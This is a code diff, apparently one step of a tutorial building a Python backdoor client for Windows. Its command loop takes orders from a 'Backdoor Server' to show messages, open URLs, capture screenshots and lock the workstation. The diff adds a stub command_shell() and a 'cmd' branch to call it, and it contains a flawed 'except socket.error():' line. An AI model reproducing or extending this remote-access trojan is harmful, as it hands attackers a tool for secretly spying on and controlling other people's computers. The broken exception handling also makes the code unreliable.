@@ -148,6 +148,9 @@ def lock():
     ctypes.windll.user32.LockWorkStation()
 
 
+def command_shell():
+    pass
+
 
 # Define `MessageBox()` Function to Show Received Message from the Server
 def MessageBox(message):
@@ -164,31 +167,38 @@ def MessageBox(message):
 while True:
     try:
         while True:
-            # Receive Data(Command) from the Backdoor Server and Decode it
+            # Receive and Decode Received Data(Command) from the Backdoor Server
             strData = recv(intBuffer)
             strData = decode_utf8(strData)
 
-            # --x, Exit command received from Backdoor server
+            # When '--x' Command Submit, Receive 'exit' from the Backdoor server
             if strData == 'exit':
                 objSocket.close() # noqa
                 exit(0)
 
-            # --m, Message received from the Backdoor server
+            # When '--m' Command Submit, Receive 'msg' from the Backdoor server
             elif strData[:3] == 'msg':
                 MessageBox(strData[4:])
 
-            # --o, Open received URL from the Backdoor server in Backdoor Client Browser
+            # When '--o' Command Submit, Receive 'site' from the Backdoor server
             elif strData[:4] == 'site':
                 webbrowser.get().open(strData[4:], new=2)
                 
+            # When '--p' Command Submit, Receive 'screen' from the Backdoor server
             elif strData == 'screen':
                 screenshot()
 
+            # When '--p 1' Command Submit, Receive 'prscreen' from the Backdoor server
             elif strData == 'prscreen':
                 screenshot(all_screens=False)
 
+            # When '--x 1' Command Submit, Receive 'lock' from the Backdoor server
             elif strData == 'lock':
                 lock()
+
+            # Step 34: Add New `elif` Statement in Main While to Detect 'cmd' Command
+            elif strData == 'cmd':
+                command_shell()
 
     # Handle if Backdoor Server not Responding try to Reconnect to Server
     except socket.error():
